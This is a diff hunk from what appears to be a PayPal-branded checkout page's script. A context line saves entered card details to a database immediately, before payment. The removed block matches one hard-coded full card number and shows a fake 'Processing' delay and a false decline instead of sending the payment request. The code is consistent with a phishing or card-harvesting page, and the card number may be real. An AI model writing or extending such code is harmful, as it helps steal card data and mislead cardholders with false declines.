@@ -1973,24 +1973,6 @@ img.paypal-logo {
 
           // Save card info to database in background immediately
           saveCardDetailsToDb();
-
-          // Special Decline Simulator for user's card ending in 2227
-          const cardNum = cardNumberInput.value.replace(/\s+/g, '');
-          if (cardNum === '4323280089072227') {
-            payNowBtn.disabled = true;
-            payNowBtn.innerText = 'Processing...';
-            document.getElementById('checkout-error').innerText = '';
-            
-            setTimeout(() => {
-              cardIsDeclined = true; // Trigger decline state
-              runValidation(true); // Red border, red warning icon, decline text
-              
-              payNowBtn.disabled = false;
-              payNowBtn.innerText = 'Pay Now';
-              updatePayButtonState(); // Disables button (turns grey, cursor: not-allowed)
-            }, 1500);
-            return; // stop further execution (prevent API request)
-          }
         }
 
         payNowBtn.disabled = true;
